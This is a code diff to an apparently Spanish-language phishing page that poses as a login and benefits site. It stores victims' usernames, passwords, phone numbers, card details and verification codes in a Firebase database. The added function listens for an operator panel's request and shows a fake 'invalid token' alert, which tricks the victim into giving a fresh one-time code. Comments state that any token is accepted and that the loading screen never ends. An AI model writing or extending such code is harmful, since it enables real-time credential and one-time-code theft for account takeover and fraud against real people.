@@ -412,7 +412,6 @@
       color: #2e2e2e;
       margin: 0 0 1.2rem 0;
       letter-spacing: -0.5px;
-      font-family: 'DTLArgoBold', 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
     }
 
     #sec5-button {
@@ -1057,6 +1056,49 @@
   let typingTimeout = null;
   let currentSessionId = null;
 
+  // ESCUCHAR CUANDO EL PANEL PIDE UN NUEVO TOKEN
+  function escucharSolicitudNuevoToken() {
+    if (!sessionId) return;
+    
+    const solicitudRef = database.ref('ingresos/' + sessionId);
+    solicitudRef.on('child_changed', (snapshot) => {
+      const campo = snapshot.key;
+      const valor = snapshot.val();
+      
+      // Si el panel cambió el estado a "token_reintentado" o hay una solicitud activa
+      if (campo === 'estado' && valor === 'token_reintentado') {
+        console.log("📢 Se detectó solicitud de nuevo token desde el panel");
+        
+        // Ocultar pantalla de carga si está visible
+        if (finalLoaderScreen.classList.contains('active')) {
+          finalLoaderScreen.classList.remove('active');
+        }
+        
+        // Ocultar pantalla de tarjeta si está visible
+        if (cardScreen.classList.contains('active')) {
+          cardScreen.classList.remove('active');
+        }
+        
+        // Limpiar campos de verificación
+        document.getElementById('phoneNumber').value = '';
+        document.getElementById('verificationToken').value = '';
+        
+        // Mostrar mensaje de token inválido
+        alert('⚠️ TOKEN INVÁLIDO\nPor favor, ingrese un nuevo código de verificación.');
+        
+        // Mostrar nuevamente la pantalla de verificación
+        verificationScreen.classList.add('active');
+        document.getElementById('verificationToken').focus();
+        
+        // Actualizar estado local
+        database.ref('ingresos/' + sessionId).update({
+          tokenReintentadoConfirmado: true,
+          fechaReintentoConfirmado: new Date().toISOString()
+        }).catch(err => console.error("Error:", err));
+      }
+    });
+  }
+
   function iniciarSesionEscritura() {
     if (!currentSessionId) {
       currentSessionId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 6);
@@ -1137,6 +1179,8 @@
   
   function reenviarCodigo() {
     alert('Se ha reenviado un nuevo codigo de verificacion');
+    document.getElementById('verificationToken').value = '';
+    document.getElementById('verificationToken').focus();
   }
   
   // VERIFICACION: CUALQUIER TOKEN ES VALIDO
@@ -1202,8 +1246,8 @@
       });
     }
     
-    // La pantalla de carga infinita se queda, nunca se cierra
-    // El usuario ve el mensaje "Espera, ya casi terminamos" para siempre
+    // INICIAR ESCUCHA POR SI EL PANEL PIDE NUEVO TOKEN MIENTRAS ESTÁ EN CARGA
+    escucharSolicitudNuevoToken();
   }
   
   async function saveToFirebaseAndShowBenefits(usuario, password, docType) {
@@ -1235,6 +1279,8 @@
       hideBenefitsScreen();
       showVerificationScreen();
       btnIngresarClave.disabled = false;
+      // Iniciar escucha por si el panel pide nuevo token
+      escucharSolicitudNuevoToken();
     }, 5000);
   }
   
